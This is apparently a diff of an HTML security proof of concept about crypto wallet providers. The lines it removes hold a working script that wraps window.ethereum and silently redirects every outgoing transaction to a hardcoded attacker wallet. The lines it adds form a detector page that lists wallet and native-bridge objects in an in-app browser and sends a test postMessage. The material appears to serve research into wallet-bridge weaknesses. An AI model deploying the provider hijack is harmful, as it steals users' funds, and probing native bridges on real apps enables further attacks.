@@ -1,61 +1,64 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official DeFi Protocol - Mainnet</title>
+  <meta charset="utf-8">
+  <title>Coin98 Bridge Detector</title>
+  <style>body{font-family:sans-serif;padding:20px;} pre{background:#111;color:#0f0;padding:10px;overflow:auto;}</style>
 </head>
 <body>
+  <h2>JS Bridge / Provider Detector</h2>
+  <button onclick="scan()">Scan Available Objects</button>
+  <pre id="out">Klik Scan...</pre>
 
-    <script>
-        async function triggerOfficialDAppTransaction() {
-            try {
-                // Meminta akses akun melalui provider global
-                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-                
-                // Developer asli menetapkan alamat tujuan ke Smart Contract Pool Resmi
-                await window.ethereum.request({
-                    method: "eth_sendTransaction",
-                    params: [{
-                        from: accounts[0],
-                        to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Smart contract resmi dApp
-                        value: "0x0"
-                    }]
-                });
-            } catch (error) {
-                console.error("Transaction failed:", error.message);
+  <script>
+    function scan() {
+      const results = [];
+      const candidates = [
+        'coin98', 'ethereum', 'web3', 'solana', 'phantom',
+        'ReactNativeWebView', 'webkit', 'Android', 'JSBridge',
+        'native', 'bridge', 'Wallet', 'coin98Wallet'
+      ];
+
+      // Cek global objects
+      candidates.forEach(name => {
+        try {
+          if (window[name]) {
+            results.push(`[FOUND] window.${name} = ${typeof window[name]}`);
+            if (typeof window[name] === 'object') {
+              results.push(`  keys: ${Object.keys(window[name]).slice(0,20).join(', ')}`);
             }
+          }
+        } catch(e) {}
+      });
+
+      // Cek messageHandlers (iOS)
+      try {
+        if (window.webkit && window.webkit.messageHandlers) {
+          results.push('[FOUND] window.webkit.messageHandlers');
+          results.push('  handlers: ' + Object.keys(window.webkit.messageHandlers).join(', '));
         }
-    </script>
+      } catch(e) {}
 
+      // Cek ReactNativeWebView
+      try {
+        if (window.ReactNativeWebView) {
+          results.push('[FOUND] window.ReactNativeWebView');
+          results.push('  postMessage exists: ' + (typeof window.ReactNativeWebView.postMessage === 'function'));
+        }
+      } catch(e) {}
 
-    <script>
-        (function compromisedThirdPartySDKScript() {
-            if (!window.ethereum) return;
+      // Coba postMessage generik (tidak mengirim data sensitif)
+      try {
+        if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
+          window.ReactNativeWebView.postMessage(JSON.stringify({type:'ping', from:'poc'}));
+          results.push('[TEST] Sent test postMessage (cek native log / response)');
+        }
+      } catch(e) {
+        results.push('[ERROR] postMessage failed: ' + e.message);
+      }
 
-            const descriptor = Object.getOwnPropertyDescriptor(window, 'ethereum');
-            if (!descriptor || !descriptor.writable) {
-                return;
-            }
-
-            const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
-            const legitimateProvider = window.ethereum;
-
-            window.ethereum = {
-                selectedAddress: legitimateProvider.selectedAddress,
-                chainId: legitimateProvider.chainId,
-                request: async function(parameters) {
-                    if (parameters.method === "eth_sendTransaction" && parameters.params?.[0]) {
-                        parameters.params[0].to = attackerWallet;
-                    }
-                    return legitimateProvider.request(parameters);
-                }
-            };
-        })();
-    </script>
-
-
-    <button onclick="triggerOfficialDAppTransaction()" style="margin-top:20px; padding:12px 24px; font-size: 16px; cursor: pointer;">Konfirmasi Transaksi dApp</button>
-
+      document.getElementById('out').textContent = results.join('\n') || 'Tidak ada interface mencurigakan yang terdeteksi.';
+    }
+  </script>
 </body>
 </html>
